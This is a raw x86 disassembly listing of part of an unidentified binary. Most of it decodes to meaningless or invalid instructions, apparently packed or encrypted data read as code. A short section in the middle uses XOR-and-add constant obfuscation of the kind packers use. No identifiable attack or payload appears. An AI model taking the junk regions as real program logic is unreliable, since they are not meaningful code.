  41ae5d:	ins    DWORD PTR es:[edi],dx
  41ae5e:	or     edi,DWORD PTR [ebx+0x4101360c]
  41ae64:	jns    0x41ae31
  41ae66:	and    DWORD PTR [esp+edi*2-0x1f5a1a1b],0x4a5bd821
  41ae71:	add    al,0xdb
  41ae73:	andps  xmm0,XMMWORD PTR [eax-0x65]
  41ae77:	(bad)  
  41ae78:	(bad)  
  41ae79:	mov    ah,0x53
  41ae7b:	add    dh,dh
  41ae7d:	repz fisub WORD PTR ds:0x7f880e2d
  41ae84:	and    al,0xd4
  41ae86:	xchg   ecx,eax
  41ae87:	cwde   
  41ae88:	adc    bh,dh
  41ae8a:	mov    bl,0x73
  41ae8c:	jl     0x41ae42
  41ae8e:	cmp    cl,BYTE PTR [esi]
  41ae90:	mov    bl,BYTE PTR [edx]
  41ae92:	bound  edx,QWORD PTR [ebx-0x52]
  41ae95:	mov    esp,0xa464e162
  41ae9a:	xor    BYTE PTR [ebx],dl
  41ae9c:	test   al,0xee
  41ae9e:	mov    edi,0xcd5fc041
  41aea3:	les    edi,FWORD PTR [ebp+0x5f6edf77]
  41aea9:	sbb    ecx,ecx
  41aeab:	jecxz  0x41aed5
  41aead:	dec    edi
  41aeae:	mov    ch,0xcf
  41aeb0:	test   DWORD PTR [edi+0x7d],ecx
  41aeb3:	jns    0x41aee0
  41aeb5:	dec    esi
  41aeb6:	arpl   WORD PTR [esi],cx
  41aeb8:	loop   0x41ae43
  41aeba:	mov    eax,0x33e1b1f6
  41aebf:	and    eax,0x813d78ae
  41aec4:	stos   DWORD PTR es:[edi],eax
  41aec5:	shl    ebx,cl
  41aec7:	das    
  41aec8:	sub    bh,BYTE PTR [ebx]
  41aeca:	cmp    eax,edx
  41aecc:	inc    ecx
  41aecd:	jne    0x41af43
  41aecf:	add    BYTE PTR [ebx+ebx*2+0x402a2bad],ah
  41aed6:	and    edi,esp
  41aed8:	dec    ebx
  41aed9:	mov    ecx,0x7c3e188
  41aede:	xor    al,0x5e
  41aee0:	sbb    al,0x9c
  41aee2:	and    DWORD PTR [eax],0xd1f4097b
  41aee8:	std    
  41aee9:	xchg   BYTE PTR [ecx-0x3e],bl
  41aeec:	aam    0x26
  41aeee:	cld    
  41aeef:	mov    dl,0xc5
  41aef1:	jns    0x41af15
  41aef3:	xchg   DWORD PTR [ebp+0x33],edi
  41aef6:	cmp    eax,0x27612809
  41aefb:	or     dh,BYTE PTR [ecx+0x30724bc4]
  41af01:	xchg   edx,eax
  41af02:	and    dl,bh
  41af04:	jecxz  0x41af40
  41af06:	push   esi
  41af07:	inc    edi
  41af08:	push   esi
  41af09:	outs   dx,BYTE PTR ds:[esi]
  41af0a:	mov    edx,0x734c3334
  41af0f:	push   0x710da263
  41af14:	ins    DWORD PTR es:[edi],dx
  41af15:	lods   al,BYTE PTR ds:[esi]
  41af16:	jl     0x41af2e
  41af18:	sbb    eax,0x4d6c5793
  41af1d:	and    BYTE PTR [esi],bh
  41af1f:	pushf  
  41af20:	in     eax,0x8d
  41af22:	or     esp,ecx
  41af24:	add    ecx,DWORD PTR [edx+ebx*4]
  41af27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af28:	cmp    dl,0x90
  41af2b:	fistp  QWORD PTR [ebx+0x3587925b]
  41af31:	push   0x5c5fd66c
  41af36:	cwde   
  41af37:	xchg   esi,eax
  41af38:	imul   esi,esp,0xffffff83
  41af3b:	sub    al,BYTE PTR [ebx+eiz*2]
  41af3e:	lds    edx,FWORD PTR [edi-0xe]
  41af41:	dec    eax
  41af42:	sub    eax,0xd5f11c7f
  41af47:	sbb    bl,BYTE PTR [edi]
  41af49:	add    DWORD PTR [ebp-0x350e0c87],0x7656abad
  41af53:	lock xchg ebp,eax
  41af55:	sahf   
  41af56:	ja     0x41afac
  41af58:	or     al,0x44
  41af5a:	pop    ebx
  41af5b:	mov    eax,ds:0xdc5a61ab
  41af60:	xchg   ebp,eax
  41af61:	or     al,0xcb
  41af63:	push   ebp
  41af64:	jns    0x41af63
  41af66:	je     0x41af00
  41af68:	push   ecx
  41af69:	dec    edx
  41af6a:	lock mov ds:0x3a478ff3,al
  41af70:	dec    edi
  41af71:	out    dx,al
  41af72:	mov    edi,0xb5e4404c
  41af77:	sub    eax,edi
  41af79:	mov    dh,0x99
  41af7c:	aad    0x1e
  41af7e:	and    esp,esp
  41af80:	test   eax,0xa574c0c5
  41af85:	lea    esp,[eax-0x71]
  41af88:	cmp    ebx,DWORD PTR [eax-0x3a5e4b2f]
  41af8e:	jmp    0x41af27
  41af90:	popf   
  41af91:	mov    dh,0xfd
  41af93:	addps  xmm1,XMMWORD PTR [esi-0x40]
  41af97:	and    ebx,DWORD PTR [edi+0x6e]
  41af9a:	mov    ebx,0x644a9784
  41af9f:	inc    esp
  41afa0:	fild   DWORD PTR [ecx+ebp*8]
  41afa3:	mov    ecx,0x55636476
  41afa8:	sbb    bl,dh
  41afaa:	lods   al,BYTE PTR ds:[esi]
  41afab:	adc    al,0x87
  41afad:	retf   
  41afae:	jmp    0x41b1e3
  41afb3:	(bad)
  41afb6:	int    0xd4
  41afb8:	int    0xd9
  41afba:	fnstcw WORD PTR [edi-0x69e7effd]
  41afc0:	out    0x1d,eax
  41afc2:	mov    WORD PTR [eax],ss
  41afc4:	fidivr WORD PTR [edi+0x78]
  41afc7:	adc    BYTE PTR [esi+0x78],bh
  41afca:	js     0x41b032
  41afcc:	inc    eax
  41afcd:	pop    ebp
  41afce:	xor    edx,esi
  41afd0:	jne    0x41afba
  41afd2:	mov    bh,0xe1
  41afd4:	outs   dx,DWORD PTR ds:[esi]
  41afd5:	mov    BYTE PTR [ebp+0x1],cl
  41afd8:	sbb    edx,DWORD PTR [ecx]
  41afda:	add    eax,0x6b84ee7c
  41afdf:	data16 mov cs,WORD PTR [ebp+0x4525b473]
  41afe6:	xor    DWORD PTR [ecx],esp
  41afe8:	sbb    bl,BYTE PTR [ecx]
  41afea:	enter  0x3562,0xcd
  41afee:	lock mov edx,0x8b9b3c4
  41aff4:	add    BYTE PTR [ebx+0x7836d6dc],0x43
  41affb:	jb     0x41af8e
  41affd:	push   cs
  41affe:	sub    al,0x90
  41b000:	icebp  
  41b001:	push   eax
  41b002:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b003:	dec    edi
  41b004:	mov    BYTE PTR [ecx+0x370a27e6],ah
  41b00a:	pop    ecx
  41b00b:	mov    edi,0x92b8941e
  41b010:	cwde   
  41b011:	xchg   cl,ch
  41b013:	repz sub BYTE PTR [edx+0x69],0x41
  41b018:	(bad)  [edi+0x31]
  41b01b:	xchg   ebx,eax
  41b01c:	ficomp WORD PTR [edx]
  41b01e:	mov    ebx,0xcee55a6a
  41b023:	adc    eax,0xdadce8d1
  41b028:	sub    DWORD PTR [esi-0x80],ebp
  41b02b:	jl     0x41afad
  41b02d:	add    eax,0x2c49e4ee
  41b032:	mov    bl,0x6c
  41b034:	ret    0xde4e
  41b037:	push   cs
  41b038:	dec    ecx
  41b039:	sub    DWORD PTR [ebx],edi
  41b03b:	rcr    BYTE PTR [esi-0x7b799844],cl
  41b041:	inc    esp
  41b042:	add    al,0x47
  41b044:	mov    al,0xaa
  41b046:	inc    eax
  41b047:	push   esi
  41b048:	outs   dx,DWORD PTR ds:[esi]
  41b049:	dec    esp
  41b04a:	pop    ss
  41b04b:	sub    ch,BYTE PTR [esp+edx*4]
  41b04e:	and    dh,cl
  41b050:	jecxz  0x41b0b9
  41b052:	adc    cl,cl
  41b054:	mov    ds:0x271c129e,al
  41b059:	ror    DWORD PTR [esi],0x46
  41b05c:	pop    ss
  41b05d:	adc    BYTE PTR [ecx+ebx*2-0x6128284c],bh
  41b064:	add    DWORD PTR [edi+0x32],ebp
  41b067:	push   ebx
  41b068:	call   0x7a274fd6
  41b06d:	sahf   
  41b06e:	out    dx,al
  41b06f:	inc    eax
  41b070:	jns    0x41affa
  41b072:	fld    TBYTE PTR [edx]
  41b074:	icebp  
  41b075:	cdq    
  41b076:	jnp    0x41affd
  41b078:	pop    edi
  41b079:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b07a:	xchg   ecx,eax
  41b07b:	adc    al,0x5b
  41b07d:	es fs sti 
  41b080:	adc    edx,ebp
  41b082:	adc    edx,eax
  41b084:	stc    
  41b085:	iret   
  41b086:	pop    edi
  41b087:	(bad)  
  41b088:	and    BYTE PTR [edi+0x50],dl
  41b08b:	sbb    ah,BYTE PTR [ecx-0x59]
  41b08e:	sub    dl,al
  41b090:	sub    al,0x20
  41b092:	addr16 inc eax
  41b094:	pushf  
  41b095:	out    0xf0,al
  41b097:	sar    DWORD PTR ds:0xf7c32b1f,1
  41b09d:	sbb    BYTE PTR [edx],0x8b
  41b0a0:	pop    ecx
  41b0a1:	cwde   
  41b0a2:	xchg   edx,eax
  41b0a3:	rcr    BYTE PTR [eax+ebp*4-0x9d838be],0x18
  41b0ab:	dec    ecx
  41b0ac:	popa   
  41b0ad:	push   ebp
  41b0ae:	pop    eax
  41b0af:	dec    ebp
  41b0b0:	rcl    edi,cl
  41b0b2:	cmp    eax,edi
  41b0b4:	add    al,0x14
  41b0b6:	fcmovne st,st(7)
  41b0b8:	outs   dx,DWORD PTR ds:[esi]
  41b0b9:	fwait
  41b0ba:	ins    DWORD PTR es:[edi],dx
  41b0bb:	xor    edi,DWORD PTR [ebx]
  41b0bd:	(bad)  
  41b0be:	and    al,0xc7
  41b0c0:	neg    al
  41b0c2:	mov    bl,0xbb
  41b0c4:	adc    DWORD PTR [edi+0x2f],esp
  41b0c7:	jbe    0x41b109
  41b0c9:	mov    cl,0xff
  41b0cb:	adc    al,0x13
  41b0cd:	call   0x455c:0x817c0425
  41b0d4:	stc    
  41b0d5:	xor    DWORD PTR [esi+ecx*8+0x74],0xffffffb0
  41b0da:	jp     0x41b068
  41b0dc:	xchg   edi,eax
  41b0dd:	xor    dl,BYTE PTR [ebp+0x404b4062]
  41b0e3:	and    DWORD PTR [ecx-0x5b566516],eax
  41b0e9:	add    eax,0x5230813e
  41b0ee:	in     eax,0xa4
  41b0f0:	xchg   edx,eax
  41b0f1:	sbb    BYTE PTR [eax-0x27],0x42
  41b0f5:	push   ss
  41b0f6:	sbb    DWORD PTR [ecx-0x47],0xa829ae13
  41b0fd:	xor    DWORD PTR [eax-0x63],ebx
  41b100:	push   edx
  41b101:	mov    dl,0xf4
  41b103:	fisubr DWORD PTR [edx+eiz*8+0x34]
  41b107:	sub    ecx,DWORD PTR [ebx+edx*2-0x2dde7fd6]
  41b10e:	dec    edi
  41b10f:	sub    BYTE PTR [ebx],0x7d
  41b112:	dec    eax
  41b113:	pop    ds
  41b114:	test   al,0xef
  41b116:	sbb    ah,BYTE PTR [edi]
  41b118:	gs (bad) 
  41b11a:	and    ebp,DWORD PTR [eax-0x10]
  41b11d:	add    edi,esp
  41b11f:	(bad)  
  41b120:	push   0xc61ffd72
  41b125:	pop    ecx
  41b126:	repz dec ecx
  41b128:	inc    ecx
  41b129:	inc    edi
  41b12a:	(bad)  
  41b12b:	dec    ebx
  41b12c:	pop    ebx
  41b12d:	jg     0x41b182
  41b12f:	pop    edx
  41b130:	jo     0x41b17a
  41b132:	mov    bl,0x74
  41b134:	mov    ebx,0x949841b8
  41b139:	lea    esp,[eax+0x57193cb1]
  41b13f:	(bad)
  41b143:	jns    0x41b130
  41b145:	xchg   esi,eax
  41b146:	js     0x41b149
  41b148:	mov    ebp,0x5fa59e29
  41b14d:	outs   dx,DWORD PTR ds:[esi]
  41b14e:	xchg   DWORD PTR [edx],edi
  41b150:	mov    BYTE PTR ds:0x4f2eff1d,bh
  41b156:	pop    edi
  41b157:	push   eax
  41b158:	jae    0x41b1a8
  41b15a:	mov    dh,0xd3
  41b15c:	adc    esp,DWORD PTR [ecx]
  41b15e:	dec    eax
  41b15f:	test   al,0x6e
  41b161:	add    eax,edi
  41b163:	or     eax,DWORD PTR [esi+0x23]
  41b166:	(bad)  
  41b167:	sti    
  41b168:	inc    ecx
  41b169:	aas    
  41b16a:	add    al,0x1d
  41b16c:	pop    ecx
  41b16d:	(bad)  
  41b16e:	mov    ?,WORD PTR [eax+eax*2+0x24ee219a]
  41b175:	test   DWORD PTR [esi-0x602d42e2],0xad66b9d6
  41b17f:	call   0xefe1f991
  41b184:	mov    fs,WORD PTR [ecx-0x56]
  41b187:	cmp    eax,0xf5d6d120
  41b18c:	rol    dh,1
  41b18e:	mov    eax,es:0xbb68b9ce
  41b194:	sbb    DWORD PTR [ecx],0xffffffc4
  41b197:	ins    BYTE PTR es:[edi],dx
  41b198:	pop    ebx
  41b199:	lahf   
  41b19a:	pop    ss
  41b19b:	and    ebp,DWORD PTR [esi-0x33]
  41b19e:	inc    eax
  41b19f:	sbb    al,0xa8
  41b1a1:	fdivr  DWORD PTR [ebp+0x61]
  41b1a4:	ins    BYTE PTR es:[edi],dx
  41b1a5:	adc    BYTE PTR [ecx-0x55],ch
  41b1a8:	jp     0x41b1e2
  41b1aa:	outs   dx,DWORD PTR ds:[esi]
  41b1ab:	(bad)  [edx]
  41b1ad:	pop    ss
  41b1ae:	imul   ebp,DWORD PTR [esp+ebp*4-0x64aee31b],0x50
  41b1b6:	test   eax,0x3c39f45a
  41b1bb:	shr    DWORD PTR [edx-0x4655b8d3],1
  41b1c1:	icebp  
  41b1c2:	jmp    0x22c0:0xf872ad98
  41b1c9:	jle    0x41b16a
  41b1cb:	inc    ebx
  41b1cc:	jae    0x41b233
  41b1ce:	rcl    DWORD PTR [ebx-0x77],cl
  41b1d1:	jo     0x41b1db
  41b1d3:	jle    0x41b1cb
  41b1d5:	or     DWORD PTR [esi+esi*8],0x6953afaf
  41b1dc:	push   0xffffffbb
  41b1de:	xor    edi,edi
  41b1e0:	aam    0xb2
  41b1e2:	fimul  DWORD PTR [ecx-0x75]
  41b1e5:	inc    ebp
  41b1e6:	in     al,0xe9
  41b1e8:	xor    BYTE PTR [edx],al
  41b1ea:	add    BYTE PTR [eax],al
  41b1ec:	iret   
  41b1ed:	enter  0xd0d3,0xd3
  41b1f1:	fcmovnu st,st(3)
  41b1f3:	xlat   BYTE PTR ds:[ebx]
  41b1f4:	push   esp
  41b1f5:	rol    BYTE PTR ss:[di],0x39
  41b1fa:	lea    esi,[esi+0x787fdc28]
  41b200:	adc    BYTE PTR [esi+0x78],bh
  41b203:	js     0x41b1a4
  41b205:	or     DWORD PTR [eax+esi*2],edi
  41b208:	adc    al,0xed
  41b20a:	test   DWORD PTR [edx-0x4f36deeb],eax
  41b210:	add    al,0x14
  41b212:	push   cs
  41b213:	adc    ecx,edx
  41b215:	retf   
  41b216:	fwait
  41b217:	jns    0x41b1d2
  41b219:	fnsave [edi]
  41b21b:	or     cl,BYTE PTR [edi-0x9]
  41b21e:	and    eax,0xf7922a12
  41b223:	lods   eax,DWORD PTR ds:[esi]
  41b224:	arpl   WORD PTR [ecx+0x6b76e6f0],di
  41b22a:	push   edi
  41b22b:	jp     0x41b1df
  41b22d:	lea    edi,ds:0x6adff486
  41b233:	(bad)  
  41b234:	in     al,dx
  41b235:	mov    dh,dl
  41b237:	jb     0x41b21d
  41b239:	dec    esp
  41b23a:	or     al,0xfc
  41b23c:	pop    esi
  41b23d:	and    BYTE PTR [edi-0x34],dl
  41b240:	iret   
  41b241:	aam    0x1c
  41b243:	sbb    dl,BYTE PTR [ecx+0x32]
  41b246:	(bad)  
  41b247:	loopne 0x41b259
  41b249:	or     eax,DWORD PTR [eax+eax*4-0xa4b0994]
  41b250:	inc    esi
  41b251:	lods   eax,DWORD PTR ds:[esi]
  41b252:	ins    DWORD PTR es:[edi],dx
  41b253:	xchg   ebx,eax
  41b254:	push   ds
  41b255:	sub    BYTE PTR [edx+0x49],bl
  41b258:	sti    
  41b259:	add    dh,bh
  41b25b:	in     al,0xf8
  41b25d:	test   BYTE PTR [edx+0x7f0a9586],bh
  41b263:	xchg   edi,eax
  41b264:	stc    
  41b265:	lock mov ecx,eax
  41b268:	or     BYTE PTR [ebp+ecx*8+0x34],dl
  41b26c:	int    0x8a
  41b26e:	xor    dl,BYTE PTR [edx]
  41b270:	add    al,0x11
  41b272:	int3   
  41b273:	push   ecx
  41b274:	xlat   BYTE PTR ds:[ebx]
  41b275:	loop   0x41b227
  41b277:	sar    BYTE PTR ds:0xf9e01edb,0x7e
  41b27e:	shl    DWORD PTR [ebx],cl
  41b280:	push   0xde3cbcce
  41b285:	and    al,0x35
  41b287:	mov    ds:0x5dd37d94,al
  41b28c:	adc    esp,edx
  41b28e:	pop    ss
  41b28f:	jmp    0x26992b8e
  41b294:	mov    edx,ebp
  41b296:	es retf 0x2367
  41b29a:	cmp    al,0xf9
  41b29c:	adc    al,0xc4
  41b29e:	fnstenv [ebx]
  41b2a0:	xchg   esi,eax
  41b2a1:	add    BYTE PTR [esp+ecx*1],al
  41b2a4:	cmc    
  41b2a5:	jae    0x41b2f9
  41b2a7:	adc    DWORD PTR [eax],ebp
  41b2a9:	loop   0x41b2e6
  41b2ab:	xchg   edi,eax
  41b2ac:	sbb    dh,BYTE PTR [edx+0x1a]
  41b2af:	js     0x41b273
  41b2b1:	jp     0x41b2cd
  41b2b3:	push   0x555dca28
  41b2b8:	popa   
  41b2b9:	ins    DWORD PTR es:[edi],dx
  41b2ba:	cmp    eax,0xfe7eb6aa
  41b2bf:	cmp    al,dl
  41b2c1:	push   ecx
  41b2c2:	ins    DWORD PTR es:[edi],dx
  41b2c3:	rol    DWORD PTR [edx-0x939877d],1
  41b2c9:	xor    bh,cl
  41b2cb:	fstp   QWORD PTR [eax-0x18]
  41b2ce:	jge    0x41b255
  41b2d0:	out    0x4d,al
  41b2d2:	stos   DWORD PTR es:[edi],eax
  41b2d3:	scas   al,BYTE PTR es:[edi]
  41b2d4:	retf   0x484e
  41b2d7:	xchg   esp,eax
  41b2d8:	lods   eax,DWORD PTR ds:[esi]
  41b2d9:	adc    DWORD PTR [esi],eax
  41b2db:	outs   dx,BYTE PTR ds:[esi]
  41b2dc:	sahf   
  41b2dd:	or     BYTE PTR [ebp-0x78],dl
  41b2e0:	push   ebx
  41b2e1:	sti    
  41b2e2:	xor    eax,0x12681746
  41b2e7:	sahf   
  41b2e8:	adc    esp,DWORD PTR [ecx+0x7c027940]
  41b2ee:	rcr    ebx,cl
  41b2f0:	shl    DWORD PTR [edi-0x41],cl
  41b2f3:	pop    eax
  41b2f4:	xor    dl,BYTE PTR [eax-0x8]
  41b2f7:	mov    bh,0xbf
  41b2f9:	neg    esi
  41b2fb:	fwait
  41b2fc:	jbe    0x41b349
  41b2fe:	mov    edi,0xc5ec4821
  41b303:	jnp    0x41b2d1
  41b305:	xor    ecx,DWORD PTR [ebp*8+0x20065923]
  41b30c:	xchg   esp,eax
  41b30d:	lahf   
  41b30e:	push   eax
  41b30f:	out    0x5c,eax
  41b311:	fstp   TBYTE PTR [esi-0x14]
  41b314:	cmp    bl,BYTE PTR [ebx+eiz*1]
  41b317:	inc    edi
  41b318:	mov    eax,0x4c30ffd
  41b31d:	cmp    al,0xd6
  41b31f:	lahf   
  41b320:	iret   
  41b321:	mov    ch,0x4a
  41b323:	in     al,0xba
  41b325:	loopne 0x41b2ee
  41b327:	iret   
  41b328:	sahf   
  41b329:	mov    al,0x52
  41b32b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b32c:	scas   eax,DWORD PTR es:[edi]
  41b32d:	mov    WORD PTR [edx+0x650b4674],ss
  41b333:	pop    ecx
  41b334:	outs   dx,DWORD PTR ds:[esi]
  41b335:	lock jbe 0x41b3b1
  41b338:	pop    esi
  41b339:	das    
  41b33a:	inc    ebx
  41b33b:	xchg   BYTE PTR [esi+0x6a],cl
  41b33e:	ins    BYTE PTR es:[edi],dx
  41b33f:	mov    bh,0x1c
  41b341:	lods   al,BYTE PTR ds:[esi]
  41b342:	es cmp al,0x65
  41b345:	sub    DWORD PTR [edi+0x56],esi
  41b348:	sub    BYTE PTR [eax+0x76546718],ah
  41b34e:	xor    eax,0xb66bd2b4
  41b353:	xor    BYTE PTR [edx+0x14],dh
  41b356:	loop   0x41b382
  41b358:	ins    DWORD PTR es:[edi],dx
  41b359:	and    DWORD PTR [esi+0x3f3be23],esi
  41b35f:	sar    DWORD PTR gs:[edi+eiz*1],cl
  41b363:	aad    0xb8
  41b365:	mov    ds:0x5b67f483,eax
  41b36a:	not    DWORD PTR [edi+0x58]
  41b36d:	mov    ch,BYTE PTR [edi+0x47]
  41b370:	xchg   ecx,eax
  41b371:	inc    ecx
  41b372:	mov    eax,esi
  41b374:	add    ah,ch
  41b376:	sahf   
  41b377:	sub    ebp,DWORD PTR [ecx+edx*4-0x473f5b89]
  41b37e:	mov    esp,esi
  41b380:	cmp    bh,BYTE PTR [eax+0x38]
  41b383:	hlt    
  41b384:	xor    eax,0xfccae4b
  41b389:	jne    0x41b40a
  41b38b:	sbb    ecx,esp
  41b38d:	dec    edi
  41b38e:	add    eax,0xc844d717
  41b393:	push   ss
  41b394:	cli    
  41b395:	shr    BYTE PTR [edx],0x3a
  41b398:	lods   eax,DWORD PTR ds:[esi]
  41b399:	pop    es
  41b39a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b39b:	shl    BYTE PTR [eax+ebx*1],1
  41b39e:	(bad)  
  41b39f:	xchg   esp,eax
  41b3a0:	mov    esi,0x4d1f042c
  41b3a5:	adc    BYTE PTR [esi],bl
  41b3a7:	dec    edx
  41b3a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3a9:	enter  0x2ea1,0xb
  41b3ad:	ds pop ds
  41b3af:	mov    ebp,ebp
  41b3b1:	loopne 0x41b3be
  41b3b3:	in     eax,0x55
  41b3b5:	xor    DWORD PTR [edi],ecx
  41b3b7:	out    dx,eax
  41b3b8:	xor    edi,DWORD PTR [edx]
  41b3ba:	push   ss
  41b3bb:	and    bh,ah
  41b3bd:	dec    ebx
  41b3be:	push   edi
  41b3bf:	aas    
  41b3c0:	pop    ebp
  41b3c1:	adc    bh,bh
  41b3c3:	test   BYTE PTR [ebx],dl
  41b3c5:	mov    al,0xf3
  41b3c7:	iret   
  41b3c8:	or     DWORD PTR [ebp+0x2be4ca6a],esp
  41b3ce:	mov    ecx,0x9edac393
  41b3d3:	pop    esp
  41b3d4:	nop
  41b3d5:	jno    0x41b3f5
  41b3d7:	test   BYTE PTR [ebp+ebp*2+0x31],dh
  41b3db:	jl     0x41b42f
  41b3dd:	out    dx,eax
  41b3de:	mov    edx,0x444e509c
  41b3e3:	or     al,0xd3
  41b3e5:	sub    edx,DWORD PTR [edi]
  41b3e7:	stos   BYTE PTR es:[edi],al
  41b3e8:	or     BYTE PTR [ecx],0x4e
  41b3eb:	hlt    
  41b3ec:	mov    ebp,0x991eaa98
  41b3f1:	pop    ecx
  41b3f2:	mov    al,BYTE PTR [esi+edx*2-0x63]
  41b3f6:	aad    0x1f
  41b3f8:	cld    
  41b3f9:	push   ss
  41b3fa:	ins    DWORD PTR es:[edi],dx
  41b3fb:	push   ebp
  41b3fc:	iret   
  41b3fd:	xor    DWORD PTR ds:0x2fe1a3c,ecx
  41b403:	popf   
  41b404:	icebp  
  41b405:	rcr    BYTE PTR [eax],1
  41b407:	push   DWORD PTR [ecx]
  41b409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b40a:	mov    BYTE PTR [ebx+0x8679db3],ch
  41b410:	dec    esp
  41b411:	sbb    BYTE PTR [esi],bl
  41b413:	or     esi,DWORD PTR [eax]
  41b415:	call   0x5614ae44
  41b41a:	sahf   
  41b41b:	push   edx
  41b41c:	imul   eax,ecx
  41b41f:	sub    esp,eax
  41b421:	mov    DWORD PTR [ebp-0x24],esp
  41b424:	mov    eax,DWORD PTR [ebp-0x4]
  41b427:	mov    ecx,0x7510850
  41b42c:	xor    eax,ecx
  41b42e:	mov    edx,0x327298
  41b433:	add    eax,edx
  41b435:	mov    DWORD PTR [ebp+0x8],eax
  41b438:	mov    eax,DWORD PTR [ebp-0x18]
  41b43b:	xor    eax,ecx
  41b43d:	add    eax,edx
  41b43f:	mov    edx,DWORD PTR [ebp+0x14]
  41b442:	imul   eax,DWORD PTR [edx]
  41b445:	mov    edx,DWORD PTR [ebp-0x4]
  41b448:	xor    edx,ecx
  41b44a:	mov    ecx,DWORD PTR [ebp+0x8]
  41b44d:	lea    ecx,[edx+ecx*1+0x327298]
  41b454:	cmp    ecx,eax
  41b456:	je     0x41bfd6
  41b45c:	mov    edi,DWORD PTR [ebp-0x18]
  41b45f:	mov    eax,DWORD PTR [ebp+0x8]
  41b462:	mov    edx,DWORD PTR [ebp+0x14]
  41b465:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41b469:	mov    ecx,0x7510850
  41b46e:	xor    edx,edx
  41b470:	xor    edi,ecx
  41b472:	mov    esi,0x327298
  41b477:	add    edi,esi
  41b479:	div    edi
  41b47b:	mov    edx,DWORD PTR [ebp-0x4]
  41b47e:	xor    edx,ecx
  41b480:	lea    eax,[edx+eax*1+0x327298]
  41b487:	mov    edx,DWORD PTR [ebp+0x8]
  41b48a:	mov    edi,DWORD PTR [ebp-0x24]
  41b48d:	mov    DWORD PTR [edi+edx*4],eax
  41b490:	mov    eax,DWORD PTR [ebp-0x18]
  41b493:	mov    edx,DWORD PTR [ebp+0x8]
  41b496:	xor    eax,ecx
  41b498:	lea    eax,[eax+edx*1+0x327298]
  41b49f:	mov    DWORD PTR [ebp+0x8],eax
  41b4a2:	mov    eax,DWORD PTR [ebp-0x18]
  41b4a5:	mov    edx,DWORD PTR [ebp+0x14]
  41b4a8:	jmp    0x41b6dd
  41b4ad:	int3   
  41b4ae:	(bad)  
  41b4af:	retf   0xd9d6
  41b4b2:	fxch   st(4)
  41b4b4:	leave  
  41b4b5:	mov    ch,0xbb
  41b4b7:	push   ds
  41b4b8:	hlt    
  41b4b9:	xlat   BYTE PTR ds:[ebx]
  41b4ba:	sub    eax,0xe2c03318
  41b4bf:	jg     0x41b539
  41b4c1:	adc    BYTE PTR [esi+0x78],bh
  41b4c4:	js     0x41b466
  41b4c6:	(bad)  
  41b4c7:	sub    BYTE PTR ds:0xc81697c9,dh
  41b4cd:	push   es
  41b4ce:	mov    DWORD PTR [ebx-0x9f369d3],esi
  41b4d4:	lds    edx,FWORD PTR gs:[eax+0x16c8d283]
  41b4db:	cmp    al,BYTE PTR [edi]
  41b4dd:	popf   
  41b4de:	inc    edx
  41b4df:	cmc    
  41b4e0:	or     al,0x40
  41b4e2:	inc    esi
  41b4e3:	sbb    eax,0x2b4118e4
  41b4e8:	inc    eax
  41b4e9:	aaa    
  41b4ea:	fstp   st(6)
  41b4ec:	cdq    
  41b4ed:	cdq    
  41b4ee:	loope  0x41b48b
  41b4f0:	div    DWORD PTR [ebp-0x15cb1840]
  41b4f6:	jae    0x41b4f1
  41b4f8:	cmp    BYTE PTR [edi],dh
  41b4fa:	cmp    al,0xfe
  41b4fc:	scas   eax,DWORD PTR es:[edi]
  41b4fd:	fisttp DWORD PTR [ebp-0xdf8e652]
  41b503:	xchg   edx,eax
  41b504:	sbb    eax,0xbb57b098
  41b509:	and    cl,BYTE PTR [eax-0x33]
  41b50c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b50d:	ins    DWORD PTR es:[edi],dx
  41b50e:	ss pop eax
  41b510:	ret    
  41b511:	dec    eax
  41b512:	mov    ebx,0xf77f00cb
  41b517:	push   esp
  41b518:	xchg   DWORD PTR [edx],ecx
  41b51a:	out    0xa1,al
  41b51c:	enter  0x3809,0xb2
  41b520:	lods   al,BYTE PTR ds:[esi]
  41b521:	add    eax,0x6a498f8a
  41b526:	xchg   ebp,eax
  41b527:	inc    esi
  41b528:	std    
  41b529:	jecxz  0x41b53c
  41b52b:	addr16 inc ebx
  41b52d:	mov    bh,0xa4
  41b52f:	shr    DWORD PTR [ecx-0x50],0x64
  41b533:	xor    al,0x80
  41b535:	iret   
  41b536:	dec    esp
  41b537:	daa    
  41b538:	iret   
  41b539:	cli    
  41b53a:	push   0xffffffe7
  41b53c:	(bad)  
  41b53d:	icebp  
  41b53e:	inc    esi
  41b53f:	or     cl,BYTE PTR [ebx+0x1b]
  41b542:	lea    edx,[esi+0x6a4019f3]
  41b548:	push   eax
  41b549:	pop    edi
  41b54a:	rcl    BYTE PTR [ebx-0x4a7ba39b],0x77
  41b551:	pop    esi
  41b552:	pop    ecx
  41b553:	push   ecx
  41b554:	cdq    
  41b555:	xor    dl,cl
  41b557:	cmp    ebx,DWORD PTR [edi]
  41b559:	add    eax,0x14c60bc3
  41b55e:	xchg   esp,eax
  41b55f:	dec    ebp
  41b560:	(bad)  
  41b562:	push   ebp
  41b563:	jns    0x41b59a
  41b565:	arpl   sp,dx
  41b567:	xchg   DWORD PTR [ecx-0x19eb43d0],edi
  41b56d:	repz mov bx,0x7813
  41b572:	pop    edi
  41b573:	pop    ss
  41b574:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b575:	lahf   
  41b576:	xor    al,0x82
  41b578:	(bad)  
  41b579:	pop    edi
  41b57a:	push   0xfffffff4
  41b57c:	and    al,bl
  41b57e:	test   BYTE PTR [edx+ebp*2+0x3a],ah
  41b582:	sub    bh,BYTE PTR [ebx-0x61873177]
  41b588:	fisub  WORD PTR [esi+0x46]
  41b58b:	imul   esp,DWORD PTR [ebx+0x60],0xf30875dc
  41b592:	add    eax,0x71f5353d
  41b597:	or     dh,BYTE PTR [ecx]
  41b599:	cs inc ecx
  41b59b:	les    edi,FWORD PTR [esi+0x4741586e]
  41b5a1:	int3   
  41b5a2:	add    edi,DWORD PTR [edx-0x10beea18]
